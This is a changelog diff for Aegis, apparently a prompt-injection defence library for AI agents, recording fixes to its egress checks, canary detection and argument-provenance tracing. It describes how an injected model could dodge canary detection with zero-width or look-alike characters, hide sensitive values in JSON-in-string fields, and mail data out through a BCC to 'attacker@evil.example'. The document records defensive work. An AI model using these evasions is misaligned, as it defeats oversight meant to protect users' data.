@@ -7,6 +7,73 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Fixed
+
+- **Security (P0, #39 — sensitive-tool/egress-contract mismatch)**: a tool
+  name that matched the sensitivity table's name pattern (e.g. `/^send_/`)
+  but was not one of the exact aliases documented in
+  `src/tool-contracts.ts`'s `TOOL_ALIASES` resolved to egress contract
+  `'none'`, which `egressAuthorizationCheck` could not distinguish from "a
+  recognized tool with no destination" — it returned `'not-applicable'`
+  either way, silently falling back to the generic, whole-call
+  `hasUserSessionIntent` gate. That gate is satisfied by ANY authorized
+  destination appearing anywhere in the arguments, so a call with an
+  authorized recipient plus an unauthorized sibling field (a BCC) was
+  allowed. **Confirmed live and exploitable pre-fix**:
+  `decideAttribution('send_widgets', { to: 'alice@corp.example', bcc:
+  'attacker@evil.example' }, ...)` returned `allow`. `decideAttribution` now
+  fails closed, explicitly, whenever a sensitive action's tool name does not
+  resolve to a documented contract at all (`resolveCanonicalTool(...) ===
+  null`) — before evaluating destinations or generic gates. Canonical tools
+  that are deliberately non-egress (`delete_file`, `transfer_funds`,
+  `set_permission`, `search`, `read_file`) are unaffected; only a name Aegis
+  has no registry entry for at all takes the new path. Regression coverage
+  includes the exact PoC plus a property-style sweep of unregistered names
+  satisfying every sensitivity-table pattern.
+- **Security (P0, #40 — canary detection normalization weakness)**:
+  `canaryDetection` normalized with a local `normalizeText` (whitespace
+  collapse + lowercase only) instead of the canonical `normalizeMatchText`
+  the provenance-matching pipeline uses (invisible-character stripping +
+  NFKC/homoglyph folding). Since the canary value is rendered directly into
+  the model's own context, a model instructed by injected content to
+  reproduce "internal markers" with a zero-width character spliced in, or a
+  Cyrillic/Greek look-alike substituted for a Latin letter, could reflect an
+  altered canary that went undetected — silently defeating hidden-
+  instruction-use detection. Both sides of the comparison now go through
+  `normalizeMatchText`. Regression fixtures cover ZWJ/ZWNJ, zero-width
+  spaces, Cyrillic confusables, and NFKC-foldable fullwidth characters.
+  (Combining-diacritical-mark/"zalgo" obfuscation is a related but distinct
+  gap, tracked separately as #46 — `normalizeMatchText` does not yet strip
+  Unicode category Mn.)
+- **Security (P0, #41 — JSON-in-string provenance blind spot)**:
+  `argumentProvenanceMatch` and `contentSensitivityCheck` (`attribution.ts`)
+  walked tool-call arguments with a hand-rolled traversal that, unlike the
+  egress destination extractor, never parsed JSON embedded in string leaves.
+  A sensitive value nested inside a JSON-stringified sub-field (or
+  double-escaped) was checked as one opaque blob that essentially never
+  matches a span verbatim, so it silently failed to attribute to its
+  originating inert span — defeating the "arguments originate only from
+  inert spans" gate for every sensitive tool other than the two
+  (`send_email`, `http_post`) with bespoke egress handling. Both call sites
+  now go through a single shared, guarded traversal (`src/traversal.ts`)
+  that parses JSON-in-string (including double-escaped payloads), matching
+  what `egress.ts` already did. `egress.ts` and the circular-reference guard
+  now consume the same shared module, closing the drift between the two
+  independently-evolving traversals for good.
+- **Reliability (#44, closed as a side effect of #41)**: the shared
+  traversal is depth-guarded (`TRAVERSAL_MAX_DEPTH`), so a deeply nested
+  (but acyclic) `tool_args` payload no longer risks a stack-overflow crash
+  in `collectLeafStrings`/`hasCircularReference`. `decideAttribution` also
+  now catches a `RangeError` from any code path it calls (e.g. the plain
+  `JSON.stringify(args)` used for args-canary detection, which is not
+  depth-guarded) and converts it to the same typed, fail-closed
+  `AegisAttributionError` the existing circular-reference guard uses,
+  instead of an uncaught crash.
+- The shared traversal's cycle guard uses an ancestor-path `Set` (matching
+  `attribution.ts`'s existing correct semantics) rather than egress.ts's
+  previous "seen anywhere" `Set`, which silently dropped a DAG's second,
+  non-circular reference to a shared sub-object from destination extraction.
+
 ## [0.1.1] - 2026-09-02
 
 ### Fixed
